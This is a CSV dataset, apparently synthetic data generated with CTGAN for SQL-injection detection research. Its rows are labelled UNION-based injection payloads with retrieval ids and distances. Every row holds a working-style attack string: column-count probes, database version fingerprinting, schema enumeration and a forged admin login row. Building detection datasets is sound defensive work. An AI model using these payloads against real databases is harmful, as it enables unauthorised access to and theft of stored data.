id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000183,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,5.619748232654429
CTGAN_000184,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000040,5.07085120301392
CTGAN_000185,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000040,8.782187878390047
CTGAN_000186,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,6.086988252130996
CTGAN_000187,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000015,12.689953569451836
CTGAN_000188,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,7.210265564268373
CTGAN_000189,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,9.025473009065324
CTGAN_000190,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000067,4.806888722920346
CTGAN_000191,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000047,6.054728359342729
CTGAN_000192,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,5.858223169703438
CTGAN_000193,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000073,8.236517291030735
CTGAN_000194,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,5.778903577981265
CTGAN_000195,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000028,10.360161225322443
CTGAN_000196,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,6.878590476612855
CTGAN_000197,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,10.184249890912577
CTGAN_000198,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,7.708470642517594
CTGAN_000199,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,8.806619311710755
CTGAN_000200,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,7.792396246717501
CTGAN_000201,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,6.9646114693291805
CTGAN_000202,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,9.038491067409973
CTGAN_000203,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000047,8.828676905511465
CTGAN_000204,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,5.595174337318571
CTGAN_000205,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000067,4.822184614839626
CTGAN_000206,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,6.4170108176635345
CTGAN_000207,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,7.677421874525047
CTGAN_000208,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,7.1494859125488395
CTGAN_000209,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,5.905690160338999
CTGAN_000210,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,6.55100146251838
CTGAN_000211,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000075,7.052318570338535
CTGAN_000212,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,7.827952078911224
CTGAN_000213,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,8.257479537815184
CTGAN_000214,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000031,6.328624735525298
CTGAN_000215,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,5.916241756704091
CTGAN_000216,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,6.021423708043419
CTGAN_000217,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000059,7.434907951708685
CTGAN_000218,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,12.192771313917282
CTGAN_000219,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,6.424373178220234
CTGAN_000220,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,12.619921266447797
CTGAN_000221,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,8.829324943151837
CTGAN_000222,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000007,9.881248764494396
CTGAN_000223,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000050,7.394099657987584
CTGAN_000224,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,5.840756908921032
CTGAN_000225,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,4.293440127210896
CTGAN_000226,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000014,8.06884087079387
CTGAN_000227,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,11.180568571493106
CTGAN_000228,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000055,5.369409004863394
CTGAN_000229,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,5.657121947096297
CTGAN_000230,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000047,7.958076232129292
CTGAN_000231,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000059,6.20381497620498
CTGAN_000232,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,6.500598472640786
CTGAN_000233,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000015,13.126026214519179
CTGAN_000234,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,5.257639746726543
CTGAN_000235,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,9.337954373699917
CTGAN_000236,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000015,13.905702789639845
CTGAN_000237,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,9.73750391626544
CTGAN_000238,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,5.544509487988014
CTGAN_000239,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,6.716414047956533
CTGAN_000240,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000050,5.862650914500145
CTGAN_000241,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,6.905479376727211
CTGAN_000242,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,11.726542050364282
CTGAN_000243,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000053,9.877688989118836
CTGAN_000244,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,6.095938671457977
CTGAN_000245,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,8.424261334515256
CTGAN_000246,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000075,7.546027048934532
CTGAN_000247,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,7.528563683754669
CTGAN_000248,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,10.521527123663919
CTGAN_000249,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,8.670054856593424
CTGAN_000250,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000029,9.225992266094252
CTGAN_000251,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,6.737976709433222
CTGAN_000252,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,7.445988457651756
CTGAN_000253,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,8.145298374494274
CTGAN_000254,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,6.5488081001299525
CTGAN_000255,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000021,13.752756264255996
CTGAN_000256,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,9.520798298750186
CTGAN_000257,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000047,5.962124151518972
CTGAN_000258,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,5.529437580668865
CTGAN_000259,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,7.241868303741758
CTGAN_000260,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,5.6326171059672365
CTGAN_000261,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000047,7.782470396205328
CTGAN_000262,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,5.850095614478158
CTGAN_000263,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,10.627818129665467
CTGAN_000264,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,6.645663421691534
CTGAN_000265,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,5.9338184476031826
CTGAN_000266,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000033,6.26389956561631
CTGAN_000267,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,7.992944173893593
CTGAN_000268,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,6.541055315675319
CTGAN_000269,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,7.9799542078537495
CTGAN_000270,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,7.115241866839354
CTGAN_000271,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,7.267088439840311
CTGAN_000272,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000053,7.075245187746838
CTGAN_000273,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,10.24092409014014
CTGAN_000274,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,6.829581696575189
CTGAN_000275,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,6.074373030511442
CTGAN_000276,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000041,6.19128601594786
CTGAN_000277,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000057,6.003842725590776
CTGAN_000278,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000073,7.522150059599088
CTGAN_000279,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000011,12.126584852332057
CTGAN_000280,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,7.1501980709661686
CTGAN_000281,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,10.268197558453478
CTGAN_000282,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,7.051646648625703
CTGAN_000283,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000067,6.17797268028931
CTGAN_000284,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,10.138409651666057
CTGAN_000285,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,8.607747115148207
CTGAN_000286,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,6.25777589376857
